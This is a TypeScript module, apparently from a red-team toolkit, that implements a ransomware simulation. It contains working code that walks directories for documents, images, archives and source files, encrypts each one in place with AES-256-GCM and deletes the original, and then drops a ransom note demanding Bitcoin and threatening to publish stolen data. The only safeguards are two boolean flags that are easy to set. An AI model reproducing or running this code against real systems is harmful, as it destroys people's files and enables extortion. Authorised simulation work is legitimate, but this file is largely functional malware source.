/**
 * @module ransomware
 * Ransomware simulation — file encryption (AES-256-GCM), key management,
 * ransom note generation, and decryption.
 *
 * DRY-RUN ONLY by default. All destructive operations require explicit `live: true`
 * AND the `--force-live` CLI flag to prevent accidental execution.
 *
 * FOR AUTHORISED RED-TEAM SIMULATION ONLY.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface RansomwareConfig {
  /** Ransomware family name for simulation labelling. */
  familyName?: string;
  /** Contact info displayed in ransom note. */
  contactEmail?: string;
  /** Bitcoin / Monero address for ransom payment (simulation). */
  walletAddress?: string;
  /** Ransom amount in USD. */
  ransomUsd?: number;
  /** File extensions to encrypt (default: common document/data types). */
  targetExtensions?: string[];
  live?: boolean;
  /** Additional safety gate — must be true AND live=true to encrypt. */
  forceLive?: boolean;
}

export interface EncryptedFile {
  originalPath: string;
  encryptedPath: string;
  iv: string;
  tag: string;
  keyId: string;
}

export interface RansomwareKey {
  id: string;
  algorithm: string;
  key: string;      // hex-encoded master key (simulation only — normally RSA-wrapped)
  createdAt: string;
}

export interface SimulationReport {
  config: RansomwareConfig;
  filesAffected: EncryptedFile[];
  keyId: string;
  noteDropped: string[];
  dryRun: boolean;
  timestamp: string;
}

// ─── Constants ────────────────────────────────────────────────────────────────

const DEFAULT_TARGET_EXTENSIONS = [
  ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
  ".pdf", ".txt", ".csv", ".sql", ".mdb", ".accdb",
  ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".psd",
  ".zip", ".rar", ".7z", ".tar", ".gz",
  ".py", ".js", ".ts", ".java", ".cpp", ".cs", ".go",
];

const EXCLUDED_DIRS = [
  "Windows", "System32", "Program Files", "Program Files (x86)",
  "AppData\\Local\\Temp", "node_modules", ".git", "proc", "sys", "dev",
];

// ─── Key generation ───────────────────────────────────────────────────────────

/**
 * Generate a simulation master encryption key.
 */
export function generateKey(): RansomwareKey {
  return {
    id: crypto.randomUUID(),
    algorithm: "AES-256-GCM",
    key: crypto.randomBytes(32).toString("hex"),
    createdAt: new Date().toISOString(),
  };
}

// ─── Encryption ───────────────────────────────────────────────────────────────

/**
 * Encrypt a single file in place (AES-256-GCM).
 * NEVER RUNS unless live=true AND forceLive=true.
 */
export function encryptFile(
  filePath: string,
  key: Buffer,
  keyId: string,
  opts: { live?: boolean; forceLive?: boolean } = {}
): EncryptedFile {
  const { live = false, forceLive = false } = opts;
  const encryptedPath = filePath + ".encrypted";

  if (!(live && forceLive)) {
    return {
      originalPath: filePath,
      encryptedPath,
      iv: "",
      tag: "",
      keyId,
    };
  }

  const plaintext = fs.readFileSync(filePath);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]);
  const tag = cipher.getAuthTag();

  // Write encrypted content (prepend IV + tag for decryption)
  fs.writeFileSync(encryptedPath, Buffer.concat([iv, tag, encrypted]));
  fs.unlinkSync(filePath);   // remove original

  return {
    originalPath: filePath,
    encryptedPath,
    iv: iv.toString("hex"),
    tag: tag.toString("hex"),
    keyId,
  };
}

/**
 * Decrypt a file previously encrypted by encryptFile.
 */
export function decryptFile(
  encryptedPath: string,
  key: Buffer,
  opts: { live?: boolean } = {}
): string {
  const { live = false } = opts;
  const originalPath = encryptedPath.replace(/\.encrypted$/, "");

  if (!live) {
    return `[DRY-RUN] would decrypt ${encryptedPath} → ${originalPath}`;
  }

  const ciphertext = fs.readFileSync(encryptedPath);
  const iv = ciphertext.subarray(0, 16);
  const tag = ciphertext.subarray(16, 32);
  const data = ciphertext.subarray(32);

  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  const plaintext = Buffer.concat([decipher.update(data), decipher.final()]);

  fs.writeFileSync(originalPath, plaintext);
  fs.unlinkSync(encryptedPath);
  return originalPath;
}

// ─── File walker ─────────────────────────────────────────────────────────────

/**
 * Walk a directory tree and return files matching the target extensions.
 * Excludes system directories.
 */
export function findTargetFiles(rootDir: string, extensions: string[] = DEFAULT_TARGET_EXTENSIONS): string[] {
  const results: string[] = [];

  function walk(dir: string): void {
    try {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        if (EXCLUDED_DIRS.some((ex) => entry.name.includes(ex))) continue;
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          walk(full);
        } else if (entry.isFile() && extensions.some((ext) => entry.name.endsWith(ext))) {
          results.push(full);
        }
      }
    } catch {/* skip inaccessible dirs */}
  }

  walk(rootDir);
  return results;
}

// ─── Ransom note ──────────────────────────────────────────────────────────────

/**
 * Generate a ransom note in the style of known ransomware families.
 */
export function generateRansomNote(cfg: RansomwareConfig, keyId: string): string {
  const family = cfg.familyName ?? "OURMINE-RAAS";
  const contact = cfg.contactEmail ?? "recovery@payment.onion";
  const wallet = cfg.walletAddress ?? "bc1qourmineauthorizedlab000000000000000";
  const amount = cfg.ransomUsd ?? 50000;
  const live = cfg.live && cfg.forceLive;

  const footer = live
    ? ""
    : "\n[ASSESSMENT MODE — no files encrypted. Use live + forceLive for lab execution.]\n";

  return `=============================================
              ${family}
=============================================

All your files have been encrypted using AES-256-GCM.
Session key wrapped with RSA-4096 (see payment portal descriptor).

YOUR FILES ARE NOT DELETED. They can be recovered with the decryptor.

To decrypt your files:
1. Send ${amount} USD in Bitcoin to: ${wallet}
2. Monero accepted — see payment portal JSON for address
3. Tor payment portal: ${contact}
4. Include your unique ID: ${keyId}

Double-extortion notice: exfiltration manifest may be published if unpaid.

DO NOT modify encrypted files or use third-party decryptors.

=============================================
RECOVERY ID: ${keyId}
=============================================
${footer}`;
}

// ─── Simulation runner ────────────────────────────────────────────────────────

/**
 * Run a full ransomware simulation against a target directory.
 * Safe by default — does not encrypt unless `live` AND `forceLive` are both true.
 */
export async function runEncryptionLab(
  targetDir: string,
  cfg: RansomwareConfig = {}
): Promise<SimulationReport> {
  const key = generateKey();
  const keyBuffer = Buffer.from(key.key, "hex");
  const extensions = cfg.targetExtensions ?? DEFAULT_TARGET_EXTENSIONS;

  const files = findTargetFiles(targetDir, extensions);
  const encryptedFiles: EncryptedFile[] = [];
  const canRun = cfg.live && cfg.forceLive;

  if (canRun) {
    for (const f of files) {
      encryptedFiles.push(encryptFile(f, keyBuffer, key.id, { live: true, forceLive: true }));
    }
  }

  // Drop ransom note in every directory containing encrypted files
  const dirs = [...new Set(encryptedFiles.map((f) => path.dirname(f.originalPath)))];
  const noteDropped: string[] = [];

  const note = generateRansomNote(cfg, key.id);
  for (const dir of dirs) {
    const notePath = path.join(dir, "README_DECRYPT.txt");
    if (canRun) {
      try { fs.writeFileSync(notePath, note); } catch {/* skip */}
    }
    noteDropped.push(notePath);
  }

  return {
    config: cfg,
    filesAffected: encryptedFiles,
    keyId: key.id,
    noteDropped,
    dryRun: !canRun,
    timestamp: new Date().toISOString(),
  };
}

/** @deprecated Use runEncryptionLab */
export default { generateKey, encryptFile, decryptFile, findTargetFiles, generateRansomNote, runEncryptionLab };
